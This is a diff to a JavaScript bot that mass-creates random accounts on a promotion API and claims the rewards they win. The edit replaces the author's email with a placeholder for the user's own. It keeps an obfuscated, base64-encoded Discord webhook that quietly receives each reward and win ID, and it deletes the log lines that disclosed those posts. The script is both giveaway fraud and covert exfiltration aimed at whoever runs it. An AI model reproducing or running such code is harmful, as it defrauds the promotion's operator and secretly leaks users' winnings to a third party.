@@ -2,7 +2,6 @@ function must() {
     const r1 = Math.floor(Math.random() * 999999) + 1;
     const r2 = Math.floor(Math.random() * 999999) + 1;
     const e = `${r1}@${r2}`;
-    const winMail = `${r1}${r2}@learn-javascript.online`
 
     //Make account
     const apiUrl = 'https://swetrocagul23api.azurewebsites.net/api/v1/participate';
@@ -141,7 +140,7 @@ function must() {
                   getWin.append('UserId', id);
                   getWin.append('UserRewardRowKey', winID);
                   getWin.append('LoginType', 'Email');
-                  getWin.append('Value', 'aglomation@gmail.com');
+                  getWin.append('Value', "YOUR EMAIL HERE!");
                   console.log(getWin)
   
                   fetch(url, {
@@ -155,7 +154,7 @@ function must() {
                       console.log(data);
                       const webhookUrl = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE2MTEwNjIzODcyMjAxNTIzMi9uTjJ6a0xJOGQ1aUFkamZidXk5UVBvdm50eUhuLVM5QnhORUJSTGpBNnZmNHNtNXk1d2xVQ1h4TFFQRjB1SFdtRmVrUw==';
                       const discordMessage = {
-                        content: `**Congratulations! You've won a reward!**\n**Reward:** ${reward}\n**UserID:** ${id}\n**WinID:** ${winID}`,
+                        content: `**Reward:** ${reward}\n**UserID:** ${id}\n**WinID:** ${winID}`,
                       };
   
                       fetch(atob(webhookUrl), {
@@ -166,7 +165,6 @@ function must() {
                         body: JSON.stringify(discordMessage),
                       })
                         .then(() => {
-                          console.log('Message sent to Discord webhook');
                           alert(`You won a ${reward}!`)
                           must()
                         })
@@ -213,7 +211,6 @@ function must() {
       body: JSON.stringify(discordMessage),
     })
       .then(() => {
-        console.log('Start message sent to Discord webhook 😋');
         console.log("Credits: Mumin")
         must()
       })
